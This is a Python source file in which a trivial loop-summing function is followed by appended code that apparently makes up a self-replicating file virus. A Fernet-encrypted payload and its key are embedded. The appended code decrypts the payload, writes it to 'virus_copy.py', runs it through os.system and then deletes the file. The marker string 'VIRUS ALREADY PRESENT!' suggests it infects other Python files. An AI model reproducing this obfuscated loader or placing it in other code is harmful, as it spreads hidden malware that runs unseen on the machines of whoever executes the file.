# Original File Code
def func():
    sum=0
    for i in range(20):
        sum=sum+i
    print(sum)

func()


from cryptography.fernet import Fernet
import os
DATA_TO_INSERT ="VIRUS ALREADY PRESENT!"
encMessage=b"""gAAAAABiDSgwCdwUEZgRy2e7H5UK1mQDB9uCiGyBssYmr_d7afIpjpV9qqLWezW8phx6l2qr_ZojR3a7ff_hEyY52_ISq8soUk0wDf9D9_z3gFajtMELeE1xQYf63xNmp7HYhahHzAacLwHxMX9MbH7fPmjc004SeBU0IVb2FrzVjVPAoVK41RWtdwMh8zbXILNmt4LHlWLL4xEDYJrc6GvZt39Kj6dvRdQ_yj533UOQR63OVQJuigv7D-Y4nWYq3VGBCa7tb3aq2RkO8hnMtreziEpcrZCSnDYg2FtjhqLaedczzoDGrQXsiX44w3JXjjOYNutDqGhMnaGPRyrqLN9gwzIMJ9zdaL4qr7WWy3vKOeZWCaYjmqHEb5i4UR9w_rP2sew89Psk756Tn3TLYjG4lfSWqEm3w_6HzPTM_Rzu__SQspetHe6E0_Bz0Swq056ywllnibYzxEW0WDpq89dEpr1C_3m96GdRZZxBGn-MOFlp1Ah1LhAIT15EYKGf4vF_9dIeVds_WfsC3Jcedrn5_BrdbvPgcrwhzAnqmONNAIm2fCbVwdfL0ojdOEe4IvpHJWsJ56yDLJB5FtZ0ZODglhAnYTa3tXLTXqVJWf6VZwEi3mB6kF4EP4K9g8pozxLTzOJlAcd9WqPuD7yUbU26fZcO7Y2R-OLyGMRHfsM5FfDnT0M6lNWwTMrwgLlZX_TofMToDBEAbhOONmnC04k4AQKMEUvCBp2x80V8m3Yt_2AdxK1blXg4nNcdMCd1OCpgMMcbpn3xYCclDnXOFV_7-OLXS5j3SbUnTGPvy137iKlgO9SateELt9ecLIvP9wg84JOoO7FlTGXOfh29Gh4GUUu6W43FjeXDZJhwdB1vVeKEwktNeveDCTOVNB6rhnpik8L3d-15k8j832yJQ1xmaAbBnFVTJWp4PtQxusTnQKz5XQF9fgwxik-M2HujwKKsEuY0FolWOiX6qNb2PhezbBbIQECR10aR0QeDiTMv0ZkzaPQhxo2A7whA8Vs-Z11blkobCVOr8BMbCKnFKygIYRzuKHzYiOfTMAHq8DomBoKE7VQXBi3ethdctb1AtPoUI88vNjWJ1U_7fSYByVa6JI6i0VKZAPzlRjY7clDCo4v-PDPjod3crPF4uMvLXTLlBN6iqe-0XjrspXpk5LhqNUhRIfRdiV2H7cO0NjXok06jCoLlwJB4YJi6IaWIFdGBH7sjEFo3P1L_nnc4BUJ6eJc2veJj93BUuXzP9LK8C-6PEZYbwHAA0WSRfbpVwIuufUN_DlCqwHGw9gTIIM7b7HEdyJuiglGuY_DnWXYGe7cxxP7N21JB5Sg9EAQJ6cPJV7AkWc73wDiJzZFYBWC00h_RfNmcGynP0iwN-cp0MIwZQfP_QHV5UGi80OXJbGJcyFzrKVscWCV0RYzoeqyR4fvmqsuTo3TAY4vRd2AEumMd6S83kp67-SyZZAEVZUhpn301UIj84WwHFBg9YbfjWjykESuh5pa3DBM7uFXYWYIDlPyOswBX5MoB5P719hvKV6feIDB90m9IYr7-KgdEhQMhcI8VcFfMCRXD5sDKEQaifEw6tCCfHMAcmV7mMAT2HHP_Y1cZ9J1UbWW5c0CyPuOZMcj9Tb0cAtc4DKPEgph4iqcoVSM9V7UIDshmOcRUJ3WHCmfrVsMWiRG4DEjSGmEki4F8WY6Qm9klbUh-NgL3FmO0odtwlvECDLksC1AL6S_tjy74cR-e-wURqK_mwf-LoW0clFlAA9VpPUA7LNmJ7Mh_4LcWklTRDQx7qc8D-RmaYWGiNPketuyqpqy0OdjuUVDGgYItzGjl4w8glFsVOp4cOUs1hHFP0VT0NzhBE-vdK5eBeNXCaZBWy6e_fic0fc7xXaYwLWDYzkOFMS9CZ72MWFQIhVXuaaf4K2ZA0ZsXDKGReDKIx5YQEkKsJ6WCDolg2ieJ-3K2k1tXcgvRHRkJk6TiyrG8rs15Jr5h_FhcVL70dv4WRGST5wCc8uxoaccrvvikZUIjyCfdyPaqSmGs9jQ0_R-a_YALXfMW0JU4sv04MuJiRpT6LTvujhE1cNm3GPu9GA0x-sWr1edI3l2mo1L6-viq5KB1soOmkb0ydJo1uZ6gE_MdqsxpBbG88qK6fTL-dehsEs11O9XdJ2VoRTczqkbwxIMV_c-jg28SbMaADfr0LrubUHuvRvjp03hiKC34hbltYW0O6BMhPrfa-reP51iqO2jrg4llykiJv4Ic_IZK0Uj6-87gvfMaNK9AZe8DqsMwB67a3KmCOkS3rOeQ4uxO_lr8TieSjPUH_3mu_mPqtkKbkljcwNQlVcflWFORt0eE2RnfbGI5O4dQZMXTv7LE9HgK124Rzar64VNJ9an45Jq25iaZj6OVzm0hU-KnB74BcTodKpSx2ugiXvouGN2u-9DD_28iQIQOIPm3dmI1uqR42UY2UAE3ybUnNtrJbzap1O_RfzE3ULRXa5udkwAoSIN0jhyIsY8DmNR1_anDP6bz0TMd10iTfUc-CNCc4HZALvQRejjrqyOzkahMFL4gGrnBemsgAfyszdzTugog9hij16RJLJVHA-9L1_j_mAQUFhLwdXCTp6ph4fPwZXDBM2vqc_XjRAeUw0EzwsmNjkjFhWxx0BdLWxKxl1liG5lQ2E7bc9xV6zJ5FljbhP-8JjNnVukyi8i2SyLpBoSvcCuPBvUBtOd_B8SnO0l-mG-fXbZFGiOO_Fa-YlyW3myOsaIE-rh6kCHqzA5SSa7fXQV3lUkuLY6-2JRiiJP2_zIbYgJlDz0EAMz06_E1ojvX1FHRCTS7xh7vvN3r0R6orXrO-7FavCfn7Ov7gox6LTa4pxKVuo-rdc_NeknV7eBBW5OF2Ab1CBE8LAralijA5E6iHzb-BGndSZ_sX6zXuPDzcJWjmRj09E57AcW6UdWCe4b_k5MqjM0GYXJVc4u_6U1ft6Bk8U6QPxDGdT04SnGTFEQHew3EXYgUswDZPUghVAswDlnEqb9rxi9jNAPpgu8E9YQShZD1s4LL0sydJEQLU-RPZRrENEA9NIK8yFNs-DIlzbBcH0NGOX4O2R5FExPblPuyplIQDYgdTW-2qGaAL73uiAxKsfvqAbBJramFgLF0Wr1EWccJMc4R1mSR2nQm_9OHWLW-w3LaBrt-26jERRz5NFPVvuGTaPJSFDb-eVQJqjN4RIn4UCWd10beMC-d-DWc-XuGncAB1t6_11CZ7Ihg961zsIlE1jITcQvzgTy-JuBRmNAhDiTg93FK206kS762ySbVDuFhRcC2h9F_txU2xobcZgbI_5ZNti92KGhVQVgf3KXtEUjTT2uG3yiiUHa8BMSqqC4fv_LwKnGxulyzsmgERQhRKqWZV5_K7pXPjKZJFHBOEiyvBWaa6NG0oyGMcBEFUuQ5vX0G9UwhBAb4AXfmcW8d81xL1oFzf5lWGzuSsnozMAxEdqj5-uzRmOWHjhHgUBn6QPYQIN33fST_ILcvL2OQEXB0SiKURmatZk4qafW2ZZhXaYYxPxJm07U5DOPEW8HKeV0Uiw9-39Cc44CIhBMcdIv1_kj10sQQ_c68wpZOlb_ZYousKNo9V9lF0kAIAst-b217U7HOkndS8Na1YF07Rb118ktDzkE-EWG9hbvwfe5S4UfgQgeKntrrn6frygjPVcLYAkp3Xah4cN4xccbodeYFyKPiSBobhqZEP74Pp6llu5VMSZjkxbRnt04iy2WW2A_IiofUjhDjcBD4l1ntmPka_wMSBA-q6guXvuhENeS2AO3rLzRQDZdXJDp1UyKYoCEJ08TISlqVXsTjhM_q2Hue0dJw7abHucNDA6vC9aGipz7nJmMFC0h8Ok8FbYPHTLlElE5vspn8sL--QlDO0E11yH89lUnIALxI9Ch3q4kA2EkNMOW1-xOULR6VzCXbSAyLkYXiYtFdfRqJytvoLr69cvE3xbP-ECxDT4QEJuyYYGQdGWIm3hIy8MxDY7yDtX0q-qWo61Ce8LW1l5URz-vOjX8VvfTsAGiVvk0KpK360dkW9GVXUt7wJvtV2dXhXmn7UGDbEXCJ6lUf8sVSQ6_nyVge5tHFfAVOKTEf7PsQpsMtGoKxIJd4jgSmSeBtLQPAeI0Oy2rpCE1nJzxpqeAFM6ecJR0qMmQ1bqAbj2dKa8vAJwkb81d0wF9uMImkQMgujsGIoceZvpA82s30ycv5xr5CLrFoEbHoM-PolMpI83qhFPul4ivT1liyWvFDOQAQQ0QxLQBa4kV7Ri0OWH_pczWuPoRfQs8O7j0f0FsyyozW51OvR7mxSBOQotW72--1JduHu-QEJKP0z5PpA9pKwo5UPAzcRzsXP-Jv1t9HzU2DnqHIhxQM1WWnUFQ0QYeFw8iUeEFgobScv8bkLXSy-7E6iEao3Vv4LXCzYqLxgpFQ-Lw75AosHmxrvp1xWR84SrJN2tpTxrbSZBlcJq-KN4dEpYMY5V9fQzsj-jcbqFjAJgHHogMk-4Cp_AS9p8GJpCNE0ca_6yFGclmDs6kQ1-GxRSG1UxQ0jfZQ-_j9laKOBhfDBWOhMkqZIVT34_qfMPP4_0QU3cueLUAFobwVpkwL6H2pDSOPoOzcW32UUu_nttZ6IFrfbzI5RiNZefZPQe1TRNJ4PgXCdr1I1kNuwT4hKhT-Xsoecmov3o9cRjJ96YAx22TASjKGxNxJsZL_LfLdrBgqmK98iPOjLJby94ZweWzW-tfVcRKHVIyrbPsNSkgA5AUMWJb-uGXv4DWafOmDWpHIES5I8kv3cfu92G3_vjboQbLf48fBP7plSXnLLO4Ndih1tueqMPpZ_9f8bW9GtB9Gdl_hMinUMV4Sq8S2ArLbgGo9ZOeax_cug65TNbOw7Kc9l2KafWQ-5o1E124NNdr5zb_OXC7medQiL6W0M-JBarfsUpKLOYcsOuKNM37GIM4esJXauam9Hw=="""
key="""0otNabGm4jCmhraiIFrJ91xUD3Vq_AFhGA8DTUjurFA="""

fernet = Fernet(key)
decMessage = fernet.decrypt(encMessage).decode()
f = open("virus_copy.py","w")
f.write(decMessage)
f.close()
os.system('python virus_copy.py')
os.remove('virus_copy.py')
